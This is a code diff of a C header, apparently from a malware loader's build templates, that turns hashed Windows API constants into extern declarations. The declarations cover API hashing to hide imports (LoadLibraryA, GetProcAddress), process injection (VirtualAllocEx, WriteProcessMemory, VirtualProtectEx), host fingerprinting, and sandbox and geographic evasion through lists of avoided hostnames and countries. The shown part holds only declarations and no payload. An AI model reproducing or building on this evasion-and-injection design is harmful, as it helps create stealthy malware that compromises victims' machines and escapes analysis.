@@ -12,47 +12,40 @@ typedef struct {
     bool is_rotation_right;      // Direction of rotation
 } ObjHash;
 
-// statical hash constants for various modules and functions
-static const ObjHash USER32_HASH = %MODHASH__user32.dll%;
-static const ObjHash KERNEL32_HASH = %MODHASH__kernel32.dll%;
+// external hash constants for various modules and functions
+extern const ObjHash USER32_HASH;
+extern const ObjHash KERNEL32_HASH;
 
 // Hashes for function names
-static const ObjHash LOAD_LIBRARY_HASH = %FCTHASH__LoadLibraryA%;
-static const ObjHash GET_PROC_ADDRESS_HASH = %FCTHASH__GetProcAddress%;
-static const ObjHash QUERY_INFORMATION_PROCESS_HASH = %FCTHASH__NtQueryInformationProcess%;
+extern const ObjHash LOAD_LIBRARY_HASH;
+extern const ObjHash GET_PROC_ADDRESS_HASH;
+extern const ObjHash QUERY_INFORMATION_PROCESS_HASH;
 
 // Hashes for system information functions
-static const ObjHash GET_COMPUTER_NAME_HASH = %FCTHASH__GetComputerNameA%;
-static const ObjHash GET_DISK_FREE_SPACE_HASH = %FCTHASH__GetDiskFreeSpaceExA%;
-static const ObjHash GET_SYSTEM_INFO_HASH = %FCTHASH__GetSystemInfo%;
-static const ObjHash GET_KEYBOARD_LAYOUT_HASH = %FCTHASH__GetKeyboardLayout%;
-static const ObjHash GLOBAL_MEMORY_STATUS_HASH = %FCTHASH__GlobalMemoryStatusEx%;
+extern const ObjHash GET_COMPUTER_NAME_HASH;
+extern const ObjHash GET_DISK_FREE_SPACE_HASH;
+extern const ObjHash GET_SYSTEM_INFO_HASH;
+extern const ObjHash GET_KEYBOARD_LAYOUT_HASH;
+extern const ObjHash GLOBAL_MEMORY_STATUS_HASH;
 
 // Hashes for language and locale functions
-static const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH = %FCTHASH__GetSystemDefaultLangID%;
-static const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH = %FCTHASH__GetSystemDefaultLCID%;
+extern const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH;
+extern const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH;
 
 // Hashes for memory and thread management functions
-static const ObjHash VIRTUAL_ALLOC_HASH = %FCTHASH__VirtualAllocEx%;
-static const ObjHash WRITE_MEMORY_HASH = %FCTHASH__WriteProcessMemory%;
-static const ObjHash VIRTUAL_PROTECT_HASH = %FCTHASH__VirtualProtectEx%;
+extern const ObjHash VIRTUAL_ALLOC_HASH;
+extern const ObjHash WRITE_MEMORY_HASH;
+extern const ObjHash VIRTUAL_PROTECT_HASH;
 
-// statical arrays and sizes for avoided hostnames and countries
-static const ObjHash TARGET_HOSTNAME_PREFIX_HASH = %SANDBOX__TARGET_HOSTNAME%;
-static const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[] = {
-    %SANDBOX__AVOID_HOSTNAME%
-};
+// external arrays and sizes for avoided hostnames and countries
+extern const ObjHash TARGET_HOSTNAME_PREFIX_HASH;
+extern const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[];
 
 // List of country codes to avoid
-static const uint16_t AVOIDED_COUNTRIES[] = {
-    %SANDBOX__AVOID_COUNTRIES%
-};
+extern const uint16_t AVOIDED_COUNTRIES[];
 
 // Sizes of the avoided hostname and country arrays
-static const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE = sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES) / sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES[0]);
-static const size_t AVOIDED_COUNTRIES_SIZE = sizeof(AVOIDED_COUNTRIES) / sizeof(AVOIDED_COUNTRIES[0]);
-
-
-
+extern const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE;
+extern const size_t AVOIDED_COUNTRIES_SIZE;
 
 #endif // OBJHASH_H
